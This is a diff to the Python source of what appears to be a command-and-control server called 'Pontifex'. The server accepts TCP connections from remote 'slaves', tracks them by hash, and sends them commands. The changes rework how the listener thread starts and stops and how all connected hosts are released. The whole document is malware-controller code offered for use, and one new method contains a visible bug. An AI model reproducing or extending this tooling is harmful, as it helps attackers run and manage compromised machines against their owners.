@@ -17,9 +17,7 @@ from lib.helper import *
 from lib.debug import Debug
 from lib.c2 import C2
 from lib.dmos import Dmos
-from pygments.lexers.html import HtmlLexer
 from prompt_toolkit.shortcuts import prompt
-from prompt_toolkit.lexers import PygmentsLexer
 
 class Pontifex():
     def __init__(self):
@@ -28,6 +26,8 @@ class Pontifex():
         self.dmoss = {}
         self.c2 = C2(self.ANODE, self.APORT, self)
         self.isConnected = False
+        self.active = False
+        self.listener = None
 
     def cmdline(self):
         while 1:
@@ -37,13 +37,13 @@ class Pontifex():
 
             if command == "exit":
                 Debug.eprint(f"C2 on tcp://{self.ANODE}:{self.APORT} shutting down...")
-                clean(self.c2.s)
+                self.terminate_server()
                 os._exit(1)
             elif command == "clear":
-                os.system("clear")
+                os.system(CMD_CLEAR)
             elif command == "free":
                 self.dmoss[args].conn.send("free".encode())
-                terminate(self.dmoss[args].conn, self.dmoss, self.dmoss[args], "gracefully")
+                terminate(self.dmoss, self.dmoss[args], "gracefully")
             elif command == "list":
                 if not self.dmoss:
                     Debug.eprint("There are no slaves online")
@@ -62,25 +62,41 @@ class Pontifex():
                 clean(self.c2.s)
                 python = sys.executable
                 os.execl(python, python, *sys.argv)
+    def disconnect_all(self):
+        for dmos in self.dmoss:
+            dmos.conn.send("free".encode())
+
+    def terminate_server(self):
+        self.disconnect_all()
+        self.active = False
+        if self.listener:
+            socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((self.c2.ANODE,self.c2.APORT))
+            self.listener.join()
+        time.sleep(0.5)
 
     def listener_daemon(self):
         while 1:
-            dmos = self.c2.accept_conn()
-            for d in self.dmoss.keys():
-                if d == dmos.md5_hash:
-                    self.isConnected = True
-                    dmos.conn.send("free".encode())
-            if self.isConnected != True:
-                Debug.sprint(f"Connection from {dmos.md5_hash} ({dmos.GLOBAL})", ANODE=self.ANODE, APORT=self.APORT, thread=True)
-                #dmos.multi_handler = self
-                self.dmoss[dmos.md5_hash] = dmos
+            if self.active:
+                dmos = self.c2.accept_conn()
+                if dmos != None:
+                    for d in self.dmoss.keys():
+                        if d == dmos.md5_hash:
+                            self.isConnected = True
+                            dmos.conn.send("free".encode())
+                    if self.isConnected != True:
+                        Debug.sprint(f"Connection from {dmos.md5_hash} ({dmos.GLOBAL})", ANODE=self.ANODE, APORT=self.APORT, thread=True)
+                        #dmos.multi_handler = self
+                        self.dmoss[dmos.md5_hash] = dmos
+            else:
+                return
 
     @safe_exec
     def start_listener_daemon(self):
-        LISTENER = threading.Thread(target=self.listener_daemon)
-        LISTENER.daemon = True
+        self.listener = threading.Thread(target=self.listener_daemon)
+        #LISTENER.daemon = True
         try:
-            LISTENER.start()
+            self.listener.start()
+            self.active = True
             Debug.tprint(f"TCP server <tcp://{self.ANODE}:{self.APORT}> is online")
         except Exception as e:
             Debug.eprint(f"Unable to start daemon listener, Error: {e}")
